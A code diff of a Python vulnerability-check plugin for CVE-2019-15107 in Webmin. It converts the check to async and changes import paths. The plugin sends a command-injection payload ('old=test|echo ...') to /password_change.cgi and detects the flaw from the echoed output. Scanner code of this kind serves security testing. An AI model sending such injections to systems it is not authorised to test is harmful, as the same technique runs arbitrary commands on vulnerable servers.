@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2019_15107_BaseVerify:
     def __init__(self, url):
@@ -25,7 +25,7 @@ class CVE_2019_15107_BaseVerify:
         }
         self.check_payload = "user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % ('echo' + ' ' + self.capta)
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -36,14 +36,13 @@ class CVE_2019_15107_BaseVerify:
         """
         
         try:
-            check_req = request.post(self.url + "/password_change.cgi", headers = self.headers, data = self.check_payload)
-            if check_req.status_code ==200 and " " in check_req.text and self.capta in check_req.text:
+            check_req = await request.post(self.url + "/password_change.cgi", headers = self.headers, data = self.check_payload)
+            if check_req.status ==200 and " " in await check_req.text() and self.capta in await check_req.text():
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
+            # print(e)
+            pass
             pass
 
 if __name__ == "__main__":
